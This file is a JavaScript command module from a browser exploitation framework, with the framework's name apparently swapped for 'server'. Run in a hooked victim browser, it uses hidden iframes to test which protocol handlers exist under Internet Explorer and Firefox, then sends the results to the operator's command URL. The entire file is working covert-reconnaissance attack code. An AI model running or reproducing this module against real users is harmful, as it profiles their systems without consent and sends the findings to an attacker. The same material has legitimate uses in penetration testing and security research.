//
// Copyright (c) 2006-2025Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (Server) - https://serverproject.com
// See the file 'doc/COPYING' for copying permission
//

server.execute(function() {

	// Initialize
	var handler_results = new Array;
	var handler_protocol = "<%= @handler_protocol %>".split(/\s*,\s*/);
	var handler_addr = "<%= @handler_addr %>";
	var iframe = server.dom.createInvisibleIframe();

	// Internet Explorer
	if (server.browser.isIE()) {

		var protocol_link = document.createElement('a');
		protocol_link.setAttribute('id', "protocol_link");
		protocol_link.setAttribute('href', "");
		iframe.contentWindow.document.appendChild(protocol_link);

		for (var i=0; i<handler_protocol.length; i++) {
			var result = "";
			var protocol = handler_protocol[i];
			try {
				var anchor = iframe.contentWindow.document.getElementById("protocol_link");
				anchor.href = protocol+"://"+handler_addr;
				if (anchor.protocolLong == "Unknown Protocol")
				     result = protocol + " unknown";
				else result = protocol + " exists";
			} catch(e) {
				result = protocol + " does not exist";
			}
			handler_results.push(result);
		}
		iframe.contentWindow.document.removeChild(protocol_link);
	}

	// Firefox
	if (server.browser.isFF()) {

		var protocol_iframe = document.createElement('iframe');
		protocol_iframe.setAttribute('id', "protocol_iframe_<%= @command_id %>");
		protocol_iframe.setAttribute('src', "");
		protocol_iframe.setAttribute('style', "display:none;height:1px;width:1px;border:none");
		document.body.appendChild(protocol_iframe);

		for (var i=0; i<handler_protocol.length; i++) {
			var result = "";
			var protocol = handler_protocol[i];
			try {
				document.getElementById('protocol_iframe_<%= @command_id %>').contentWindow.location = protocol+"://"+handler_addr;
			} catch(e) {
				if (e.name == "NS_ERROR_UNKNOWN_PROTOCOL")
				     result = protocol + " does not exist";
				else result = protocol + " unknown";
			}
			if (!result) result = protocol + " exists";
			handler_results.push(result);
		}
		setTimeout("document.body.removeChild(document.getElementById('protocol_iframe_<%= @command_id %>'));",3000);
	}

	// Return results
	server.net.send('<%= @command_url %>', <%= @command_id %>, 'handlers='+JSON.stringify(handler_results));

});

